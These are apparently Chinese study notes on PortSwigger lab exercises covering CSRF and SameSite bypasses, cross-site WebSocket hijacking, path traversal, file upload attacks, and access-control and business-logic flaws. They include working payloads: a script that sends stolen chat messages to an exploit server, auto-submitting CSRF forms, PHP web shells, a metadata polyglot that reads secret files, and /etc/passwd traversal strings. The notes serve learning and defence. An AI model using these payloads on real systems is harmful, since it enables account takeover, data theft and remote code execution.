  * 有些功能没有使用服务端 301、302 之类的跳转，而是使用了 JS 改变 `location`，攻击者如果找到可以修改替换该 URL，例如 `document.location = '/account/change-email?email=hacker@evil.net'` ，这种请求浏览器认为是内部而不是跨站的，因而会携带所有 Cookie。

  * portswigger 示例，网页存在提交评论后自动返回blog 的 gadget，存在可以修改 URL 跳转的漏洞：

    ```
    <script>
        document.location = "https://0a510067046336c381440c6300ad00ad.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
    </script>
    ```

    

* 兄弟域名利用。

* Chrome 2分钟宽限。Chrome 的 Lax-by-default 有一个特殊规定，新创建的 Cookie 在 2 分钟内会即使是跨站 POST 请求也会被携带。

  

portswigger 兄弟域名实验：有一个带聊天室的 blog ，聊天室使用 websocket 传输消息，存在可以被利用的 CSWSH （跨站websocket劫持）漏洞。  

* 访问页面点击主页、聊天、登录等内容，查看 BurpSuite 中历史、Target 等信息，尝试发送消息观察交互

* websocket 握手请求中不包含任何 csrf token，客户端准备好之后发送 READY 消息给服务器

  ```http
  GET /chat HTTP/1.1
  Host: 0a4d00ae0354a8268240fc9a00610034.web-security-academy.net
  Connection: Upgrade
  Pragma: no-cache
  Cache-Control: no-cache
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
  Upgrade: websocket
  Origin: https://0a4d00ae0354a8268240fc9a00610034.web-security-academy.net
  Sec-WebSocket-Version: 13
  Accept-Encoding: gzip, deflate, br
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: session=5SEhWgLUoCuu1CXjZO4FiPI8wolwU71H
  Sec-WebSocket-Key: 9lwaQicxFnoRHWpH1A0kiQ==
  
  ```

* 使用如下脚本，尝试建立链接发送消息到  exploit 服务器（由于 collaborator 需要会员使用此方式代替）

  ```javascript
  <script>
      var ws = new WebSocket('wss://0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send("READY");
      };
      ws.onmessage = function(event) {
          // 将聊天记录通过 GET 请求发送到 Exploit Server 的日志中
          var data = encodeURIComponent(event.data);
          new Image().src = 'https://exploit-0a8c00bb042cb600802d11b2014d0036.exploit-server.net/exploit?log=' + data;
      };
  </script>
  ```

  * 由于限制了 SameSite=Strict ，发起的请求不会携带 cookie 信息，因此无法获取到消息

* 在网站上继续寻找，可以找到一些响应头中包含 `Access-Control-Allow-Origin: https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net` ，访问这个域名发现有用户名密码认证，且用户名存在 js 注入漏洞，这是这个 LAB 设计好可以用来利用的 Sink

  * 使用如下链接测试，可以成功调用 alert

    ```html
    https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3Cscript%3Ealert()%3C/script%3E&password=xxxxxx
    ```

* 再将之前的 JS 编码为 URL 形式，替换掉上面 cms 链接中 username 参数部分

  ```html
  https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%64%30%30%61%65%30%33%35%34%61%38%32%36%38%32%34%30%66%63%39%61%30%30%36%31%30%30%33%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%2f%2f%20%e5%b0%86%e8%81%8a%e5%a4%a9%e8%ae%b0%e5%bd%95%e9%80%9a%e8%bf%87%20%47%45%54%20%e8%af%b7%e6%b1%82%e5%8f%91%e9%80%81%e5%88%b0%20%45%78%70%6c%6f%69%74%20%53%65%72%76%65%72%20%e7%9a%84%e6%97%a5%e5%bf%97%e4%b8%ad%0a%20%20%20%20%20%20%20%20%76%61%72%20%64%61%74%61%20%3d%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%65%76%65%6e%74%2e%64%61%74%61%29%3b%0a%20%20%20%20%20%20%20%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%20%3d%20%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%38%63%30%30%62%62%30%34%32%63%62%36%30%30%38%30%32%64%31%31%62%32%30%31%34%64%30%30%33%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6c%6f%67%3d%27%20%2b%20%64%61%74%61%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=xxxxxx
  ```

* 将上面内容放到一个 location.href 通过 exploit 服务器发送给受害者：

  ```javascript
  <script>
      document.location = 'https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%64%30%30%61%65%30%33%35%34%61%38%32%36%38%32%34%30%66%63%39%61%30%30%36%31%30%30%33%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%2f%2f%20%e5%b0%86%e8%81%8a%e5%a4%a9%e8%ae%b0%e5%bd%95%e9%80%9a%e8%bf%87%20%47%45%54%20%e8%af%b7%e6%b1%82%e5%8f%91%e9%80%81%e5%88%b0%20%45%78%70%6c%6f%69%74%20%53%65%72%76%65%72%20%e7%9a%84%e6%97%a5%e5%bf%97%e4%b8%ad%0a%20%20%20%20%20%20%20%20%76%61%72%20%64%61%74%61%20%3d%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%65%76%65%6e%74%2e%64%61%74%61%29%3b%0a%20%20%20%20%20%20%20%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%20%3d%20%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%38%63%30%30%62%62%30%34%32%63%62%36%30%30%38%30%32%64%31%31%62%32%30%31%34%64%30%30%33%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6c%6f%67%3d%27%20%2b%20%64%61%74%61%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=xxxxxx';
  </script>
  ```

* 查看 exploit 服务器日志

  ```
  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22You%22%2C%22content%22%3A%22I%20forgot%20my%20password%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22CONNECTED%22%2C%22content%22%3A%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22You%22%2C%22content%22%3A%22Thanks%2C%20I%20hope%20this%20doesn%26apos%3Bt%20come%20back%20to%20bite%20me!%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%20foib1pv0baqzaxe0lr26%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22Hello%2C%20how%20can%20I%20help%3F%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
  ```

* 解码上面日志中内容，是受害者的聊天记录，其中包含其账号密码，登录后解决 LAB



## Referer-based 

有些应用使用 HTTP header 中的  referer 字段来尝试防御 CSRF 攻击，但这种方法效果不好，通常容易被绕过。  

portswigger 示例：

```html
<html>
    <form action="https://0ae400300445a8fc83277d4f005300ef.web-security-academy.net/my-account/change-email" method="POST">
        <meta name="referrer" content="never">
        <input type="hidden" name="email" value="victim@hacker.com">
    </form>
    <script>
        document.forms[0].submit();  // auto submit when page loaded
    </script>
</html>
```



**两种常见的“幼稚”（Naive）校验逻辑及绕过方式**   

有些网站会判断 referer 中是否包含自己的域名，可以通过如下方法绕过：

```html
<html>
    <form action="https://0a460069045eca3d801e62680069008f.web-security-academy.net/my-account/change-email?" method="POST">
        // 默认浏览器会将 URL 中的查询字符串移除然后填入 referer 字段中，主要为了保护隐私
        // Referrer-Policy: unsafe-url 是告诉浏览器发送 Referer 时不需要任何裁剪，给我把完整的 URL 原样发出去
        <meta name="referrer" content="unsafe-url">
        <input type="hidden" name="email" value="victim@hacker.com">
    </form>
    <script>
        // history.pushState() 这个方法可以在 URL 中添加查询参数，例如 ?foor=bar 这种，这样在受害者访问 expolit 服务器时会加上下面的后缀，服务器判断逻辑仅验证是否包含当前域名，过于简单就被绕过了
        history.pushState('', '', '/?https://0a460069045eca3d801e62680069008f.web-security-academy.net');
        document.forms[0].submit();  // auto submit when page loaded
    </script>
</html>

```

有一些校验逻辑是验证域名前缀是否匹配，可以通过配置包含目标 URL 域名作为子域名方式绕过。  

例如校验逻辑如下：

```
starts_with('vulnerable-website.com')
```

可以通过配置如下子域名去绕过校验：

```
http://vulnerable-website.com.attacker-website.com/csrf
```









## 如何预防 CSRF

主要还是上面提到的 CSRF-Token 和 SameSite 策略。  

**生成**  

CSRF Token 要遵循这几条准则：

* 具有高熵的不可预测，与常规会话生成要求一样
  * 使用加密安全的伪随机数生产器（Cryptographically Secure Pseudo-random Number Generator,CSPRNG），加上时间戳相关作为 seed 进行初始化
  * 如果需要比 CSPRNG 更强的加密性，可以将 CSPRNG 与用户相关的特定熵组合拼接后，再进行 hash 运算生成令牌。
* 关联到用户会话
* 在关联动作执行之前，每种场景都要严格验证



**传输**  

CSRF token 应当被视为 Secrets ，并在其存在的整个生命周期中安全处理。一种通常有效的方式是将令牌存放在 POST 提交的 HTML 表单中的隐藏字段中传输给客户端，客户端提交时该参数会被包含在其中，例如：

```html
<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
```

CSRF token 字段应该尽量在 HTML 文档的前面，理想情况下存放在任何非隐藏输入字段、用户可控的输入数据之前，以缓解攻击者构造数据操控 HTML 来获取数据。  

还有一种存放在 URL 中的方式安全性较差，因为：

* 字符串会在浏览器和服务器中多个位置被记录
* 容易通过 HTTP Referer 头传输给第三方
* 可能展示在用户屏幕浏览器上

有些应用通过在自定义 header 中传输 CSRF token。由于浏览器通常不允许跨域发送自定义 header ，因此加强了防御。但这种方法限制了应用只能使用 XHR 来发起受 CSRF token 保护的请求，增加了复杂度。  

CSRF token 不应该随着 token 一起传输。  



**验证**  

CSRF token 生成后存放在服务端的用户 session 数据中，后续收到需要验证的请求，服务器应用验证该请求是否包含一个用户会话中存储的值相匹配的 token，无论请求的方法或内容类型是什么，都应该执行此验证。如果请求未包含 token，则应该用和无效 token 时一样的方式拒绝该请求。      



**SameSite 策略**  

除了 CSRF token 之外，建议为每个 cookie 明确设置 SameSite 策略，这样无论浏览器默认策略如何，都会减少不一致的情况。理想情况下使用 strict 策略，有足够理由明确需要时才修改为 Lax 策略。  

虽然 SameSite 为跨站攻击提供防护，但对于跨源、同站攻击无效。   

如果可以将不安全的内容隔离在单独站点（例如用户上传的文件），远离敏感功能或数据。测试一个网站时，全面审计同一个站点的所有可能的攻击面，包括兄弟域名。  







# Path traversal 目录遍历

Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿越、路径遍历，会导致攻击者读取服务器上的任意数据，可能包括：代码和数据、后端凭证、系统敏感文件。一些场景中还可以写入文件，导致修改应用数据或者属性，最终拿到服务器权限。  

下面是一些常见的漏洞：

* 经过路径读取任意文件
  * 例如：代码中使用`<img src="/loadImage?filename=218.png">`来展示存放在`/var/www/html`中的图片，如果没有合适的权限配置，可能导致攻击者通过 `https://insecure-website.com/loadImage?filename=../../../etc/passwd` 一类的URL请求以 `/var/www/images/../../../etc/passwd` 这种形式访问但敏感文件。基于windows的可能使用`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini` 这种形式。
* 一些应用使用了一些常见的手段防御，但存在可以绕过的漏洞
* 限制了相对路径
  * 但是使用绝对路径访问，例如参数为 `filename=/etc/passwd`
  * 限制了只能以 `/var/www/html` 开头，但是仍然存在 `../` 这种形式的绕过
  * 限制了文件后缀，例如 `.png` ，但可以通过 `filename=../../../etc/passwd%00.png` 这种形式绕过
* 限制了 `../` 这种形式，但可以通过`....//` 或者 `....\/` 绕过，或者 `%2e%2e%2f` 、 `%252e%252e%252f`、`..%c0%af`、`..%ef%bc%8f` 这种转义绕过









# File Upload 文件上传

当一个网站应用允许用户上传到文件系统中，但没有足够的检查手段，就会导致恶意文件上传漏洞，攻击者可能会利用该漏洞上传服务端脚本开启远程代码执行。  

## 影响

文件上传漏洞的影响一般取决于这些因素：

* 网站未能正确验证文件的哪些方面，大小、类型、内容等对此的影响各不相同
* 对于上传成功的文件的限制

在最坏的情况下，

* 如果对类型没有正确验证会导致上传 `.php` 、`.jsp` 之类的可执行代码，
* 文件名未能正确验证会导致非法文件被上传覆盖正常文件，甚至通过路径穿越的形式上传到有权限的系统位置
* 文件大小未能正确验证，可能会导致磁盘被占满，潜在的 DOS(denial-of-service)。



## 产生原因





## 简单利用示例

最坏的场景下，文件上传功能没有做任何限制，导致可以上传可执行代码类型的文件。  

例如：

* php 代码 `<?php echo file_get_contents('/path/to/target/file'); ?>` ，一旦这个文件被上次就可以读取指定目录中文件数据。
* 更常见的是结合URL的系统命令执行，上传文件包含类似：`<?php echo system($_GET['command']); ?>` 的内容，攻击者通过 `GET /example/exploit.php?command=id HTTP/1.1` 这种形式调用



## 常见漏洞

### 文件类型校验缺陷

很多场景下上传文件的 html 是使用 `POST` 方法上传 `application/x-www-form-urlencoded` 上下文类型（content type），对于图片、PDF 等二进制文件，通常使用 `multipart/form-data` 上下文类型。  

示例请求：

```http
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

上面请求中使用 `Content-Disposition` 分割每一段内容，每段单独有一个 `Content-Type` 指定数据类型，当服务器以来此字段判断文件类型而不检查文件内容时，就会存在漏洞，导致恶意文件被上传。





### 阻止文件执行

作为一种预防手段，服务器可以配置仅执行 MIME 类型的脚本，其他类型文件返回错误或者直接将内容以消息形式返回。

示例：

```http
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?>

```

这种手段能最大程度上禁止 web shell 的创建，但容易存在泄露源码的风险。  







### 文件类型黑名单设置不充分



#### 覆盖服务器配置

例如假设 apache 服务器允许上传 `.htaccess` 类型的文件，攻击者上传了如下内容：

```
AddType application/x-httpd-php .jpg
```

攻击者将如下内容伪装成 jpg 类型文件上传：

```
<?php echo system($_GET['command']); ?>
```

由于 apache 会将目录下 `.htaccess` 文件中规则替换掉全局规则，这会导致将 .jpg 类型文件作为 .php 发送给解释器执行。



#### 混淆文件扩展名

即使黑名单设置的很详尽，也可能通过混淆技术被绕过。简单的示例：假设黑名单代码是区分大小写的，且未能检查出 `exploit.pHp` 是 `.php` 文件，就会被绕过。还有很多种类型：

* 提供多个扩展，取决于解析扩展名的算法，例如 `exploit.php.jpg` 
* 尾字符，有些组件会忽略结尾的 `.` 或者空格，例如 `exploit.php.` 
* 利用 URL 编码，例如 `exploit%2Ephp`
* 在文件结尾前添加分号或者URL编码的 null 字符，如果黑名单验证使用 php、java 等语言，但服务器处理文件又用的 C、C++ 等偏底层语言，文件名结尾的处理可能产生差异，例如 `exploit.asp;.jpg` 或者 `exploit.asp%00.jpg`
* 尝试使用多字节 unicode 编码，例如使用 UTF8 解析文件名 `xC0 x2E`, `xC4 xAE` 或者 `xC0 xAE` 可能被转换为 `x2E`
* 有些措施会剥离危险的扩展名，例如 `.php` ，但如果没有递归处理文件，可能会被 `exploit.p.phphp` 这种绕过





### 文件内容验证缺陷

一些对安全要求较高的应用会校验文件内容，例如 jpg 等图片文件有属性：尺寸大小，而如果攻击者上传 .php 之类的文件伪装则不存在此类属性从而被拒绝。但可以通过修改文件元属性等方式绕过检测。  

例如 exiftool，下面示例是以 shell.jpeg 为源文件，向元数据的 comment 中插入php代码数据获取密钥，生成 polyglot.php 

```
.\exiftool.exe -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpeg -o polyglot.php
```





### 文件上传条件竞争

现代 web 框架对上面几类攻击都有了更强的防御能力，通常会将文件上传到一个临时目录或者沙箱中，然后随机化文件名并加以验证，确认安全后再进行转移到目标位置。  

但有时候开发人员仍需要独立于框架之外，实现一些文件上传的处理逻辑，由此可能会带来条件竞争的问题，使得攻击者绕开这些验证防御。  

例如，网站上传文件到文件系统中，然后利用杀毒软件之类工具对该文件进行验证，未通过则删除文件，即使通常只有几秒甚至几毫秒的存在时间，黑客仍有可能执行到该文件。  

一般此类漏洞极为隐蔽，黑盒测试中很难发现，除非找到泄露的源码。



portswigger 实验中漏洞代码：

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

只要在 checkViruses 方法执行期间访问了上传的文件，文件内容仍会被执行。  

官方给的实验答案（手快一些也可以开两个浏览器页面，手工上传后访问测试）：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```







## 无远程代码执行的文件上传漏洞

前面都是可以上传远程执行代码相关的漏洞，还有一些虽然不能触发远程代码执行漏洞，但也可以通过其它方式被利用：

* 上传恶意的客户端执行脚本：攻击者在上传的 HTML、SVG 图片等资源中加入`<script>` 之类内容，用于 XSS 攻击。
* 利用文件解析或处理的漏洞，例如常见的 XML、doc、xls 等，用于 XXE 攻击。





## 利用 PUT 上传

有些 web 服务器或者框架默认配置支持了 PUT 请求，这样即使没有 web 页面用于上传文件，也会存在潜在的通过 PUT 请求上传文件漏洞。

示例：

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

一般可以给不同后端端点发送 `OPTIONS` 请求探测是否支持 `PUT` 方法。  



## 预防文件上传漏洞

文件上传相关最佳实践：

* 文件后缀白名单优于黑名单
* 检查文件名中不包含 `../` 之类的可以穿透目录的字符串
* 重命名文件以避免覆盖现有文件
* 文件被验证安全之前不上传到服务器文件系统中
* 优先使用成熟框架来处理文件上传功能，尽量避免自己写相关验证机制







# Access Control/ IDOR 访问控制失效



## 概念

访问控制是约束用户可以执行被授权的动作、可访问授权的资源。

* Authentication 验证用户身份
* Session management 标识通过验证的用户，用于后续的其它请求
* Access control 访问控制在用户执行操作时验证他们拥有的权限



### Vertical access controls 垂直访问控制

不同级别角色用户的权限，例如普通用户、管理员、超级管理员。




### Horizontal access controls 水平访问控制

不同用户的权限，例如A用户、B用户，只能访问属于自己的资源。



### Context-dependent access controls 依赖上下文的控制

依赖于上下文状态的访问控制，例如根据是否购买会员展示不同内容、购物车下单依赖商品库存状态等。





## 访问控制失效常见类型

### Vertical privilege escalation 垂直提权

如果用户能够获取或者访问到未授权的功能、资源，就属于垂直提权。  



常见漏洞类型：

* Unprotected functionality：没有对敏感功能进行限制访问，或者在一些资源中存在泄露，示例：

  * 任何用户都可以访问 `https://insecure-website.com/admin ` 
  * 将管理 url 卸载了robots 中，`https://insecure-website.com/robots.txt` 
  * 管理URL做了一些随机化处理，例如 `https://insecure-website.com/administrator-panel-yb556`，但是在一些资源中会泄露地址，例如帖子、评论等功能中展示管理地址

* Parameter-based access control：一些应用将在验证用户权限或者角色后，将下一步处理的信息参数化，存放在用户可以控制的位置，例如

  * 隐藏元素中，例如配置了 hidden 属性的 input 元素

  * cookie 中

  * 参数集合

    * 示例：

    ```
    https://insecure-website.com/login/home.jsp?admin=true
    https://insecure-website.com/login/home.jsp?role=1
    ```

* Platform misconfiguration：一些应用针对用户角色限制了 URL 、HTTP 请求方法，这种情况下各种出错都可能导致访问控制被绕过。

  * 例如 `DENY: POST, /admin/deleteUser, managers` 这样一条配置限制了非 managers 组中的用户提交 POST 请求到该 URL。

  * 一些应用框架支持非标准的 HTTP 请求头，可以覆盖 HTTP 请求中的 URL，例如 `X-Original-URL` 和 `X-Rewrite-URL`。在这种场景下，可以使用如下请求绕过

    ```http
    POST / HTTP/1.1
    X-Original-URL: /admin/deleteUser
    ...
    ```

  * 一些框架支持同一接口处理多种类型的请求，自动进行转换，此时访问控制可以通过 `GET` 请求被绕过。

* URL-matching discrepancies：网站传入的请求和定义的 endpoint 匹配时，可能存在差异：

  * 大小写不一致会被认为同一端点，但访问控制可能遗漏，此时就会被绕过
  * 对结尾`/`分隔符处理的不同，也可能被利用来绕过





### Horizontal privilege escalation 水平提权

水平提权是指通过漏洞访问到不属于自身用户的资源。  

可以使用与垂直提权类似的利用方法：

* 利用参数，例如：`https://insecure-website.com/myaccount?id=123` 这个 URL 通过传送的 id 来判断用户身份，修改id 后会进入其它用户视图

* 有的网站使用 hash 用户 id，以避免被攻击者猜测出来，但存在泄露 id 的功能或者页面，例如评论、博客作者之类，或者在一些页面中隐藏用户 id 用于其它功能。

  



### Horizontal to vertical privilege escalation 水平提权到垂直提权

如果通过水平提权获取到高等级用户的账户，例如管理员，就属于水平提权转变为垂直提权。  

​	

### Insecure Direct Object Reference(IDOR) 不安全对象引用

当应用通过用户的输入来直接访问对象时，就可能出现 IDOR 漏洞，曾经在 OWASP 2007 TOP Ten 列表。  

示例：

* 直接引用数据库对象漏洞，一个使用 URL 检索数据库来访问用户页面，例如 `https://insecure-website.com/customer_account?customer_number=132355` ,如果没有其它限制，通过修改 `customer_number` 的值就可以查看其它用户页面。  
* 直接引用静态文件漏洞，假设某网站将聊天信息使用递增顺序的文件名保存到磁盘上，允许用户通过下载文件来检索记录，例如`https://insecure-website.com/static/12144.txt` ，攻击者修改文件名就可以检索其它用户数据。



### 多步骤处理漏洞

很多网站的重要功能实现会被拆分为多个步骤，通常发生在：

* 页面存在多个输入值或者选项
* 提交之前用户需要检查、确认

示例，管理员页面存在更新用户权限的功能，由如下步骤组成：

* 加载包含用户现有详情信息的表单
* 点击提交按钮
* 检查改动内容并确认

假设在前两步都进行了严格的权限校验，但在第三步遗漏了，攻击者就可以利用此步骤来获取未授权的操作。  



### 基于 referer 的访问控制

一些网站基于 `Referer` 头参数来判断是否有权限。例如对 `/admin/deleteUser` 发起一个请求，如果 `Referer` 是来自 `/admin` 则放行，这样就给攻击者留下了漏洞，通过控制 `Referer` 的值来绕过验证。  



### 基于地理位置的访问控制

根据不同国家、省市(州)的法律法规，有些应用会限制访问来源的地理位置，通常可以通过代理、VPN 等手段绕过。  



## 预防



* 永不依赖代码混淆作为权限控制
* 除了打算做为公共访问的资源，其它资源默认拒绝访问
* 尽可能使用单一应用范围内的强制访问控制
* 在代码层面，强制要求开发人员为每个资源声明访问控制权限，并配置为默认拒绝
* 全面详细的检查和测试，确保访问控制符合设计预期





# Business logic 业务逻辑漏洞



## 产生原因和影响

通常是设计和开发团队对用户和应用之间的交互做了有缺陷的假设，可能是验证输入不充分、逻辑不够严谨等。越复杂的系统越容易出现，当多个模块的设计者或开发人员对其它交互的组件理解不深，做出一些错误假设，无意之间就会引入严重逻辑缺陷。业务逻辑漏洞的影响和功能相关，可能很轻微，也可能很严重，例如认证、金融交易之类的漏洞通常容易产生严重影响。  



  

常见的错误假设有：

* 用户只会用浏览器
* 用户不会修改隐藏元素字段
* 用户会按照顺序执行
* 用户不会重复提交
* 用户不会输入负数



复杂系统出现逻辑漏洞的主要原因：

* 代码量庞大
* 团队分工导致彼此了解不足
* 未文档化
* 功能交互复杂
* 测试覆盖不足



常见避免逻辑漏洞的方法：

* 服务端校验所有输入，永远不信任客户端
* 明确文档化假设，将所有认为“用户会...”的假设记录下来
* 整体性理解，开发者要了解自己模块之外的内容
* 异常路径测试
* 代码审查
* 状态机管理，多步骤流程用状态机，拒绝非法状态转换





## 示例

### 过度信任客户端控制

参考 Authentication 中的多因子实验。

### 处理异常输入的缺陷

实验一：购物车没有对减去商品数量做剩余数量检查，当购物车中不存在该商品时仍处理请求，通过 burpsuite 拦截修改，利用 Repeat 发送多个减去商品的请求，使得购物车中商品数量出现了负值，再加上其它商品就可以凑出较小金额进行下单。



实验二：整数溢出，购物车应用的总价使用有符号32位整数来存储，超过整数最大范围会溢出变为负值，虽然做了负值校验，不能下单，但是通过构造请求，让购物车的值恰好超过0值一些，可以完成使用少量余额下单。



实验三：应用程序对邮件地址的处理存在“不一致”：发送确认邮件的邮件服务器会使用完整的地址，而用于权限判断的应用程序后端则会把地址截断到 **255 个字符**，构造一个超长邮箱，让后端误以为是内部员工，但邮件会发送到攻击者的域名邮箱中：

```
wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@dontwannacry.com.exploit-0aea0039047564aa8377000901b00068.exploit-server.net
```





### 对用户行为的假设

* Trusted users won't always remain trustworthy
  * 实验示例：根据用户邮箱后缀判断是否为内部用户，但未对注册成功的外部用户修改邮箱做校验，导致可以修改为内部邮箱，从而访问管理页面
* Users won't always supply mandatory input
  * 实验示例：修改密码时传递当前密码，会对比当前密码是否正确，但是未传递当前密码也可以修改成功
* Users won't always follow the intended sequence
  * 实验示例：用户登录需要通过双因子，密码+邮箱验证码，攻击者已经获取到B用户密码，使用自己的A用户登录后发送验证码进行验证，进入账户主页记住URL并登出自己账号，使用B用户账号登录，在双因子验证页面，手动修改URL为之前记录的URL值
  * 有时候按照非预期的顺序提交请求去测试程序，尝试跳过不同步骤中的请求、删除部分参数、返回早期的步骤、重复某些步骤等，这种测试通常会引发异常，要密切关注异常和错误信息，看程序是否存在漏洞或攻击面。
  * 实验示例，非预期顺序：当购物车中有物品，手工修改URL为 `cart/order-confirmation?order-confirmed=true` 访问确认页面，服务器就认为已经成功付款。
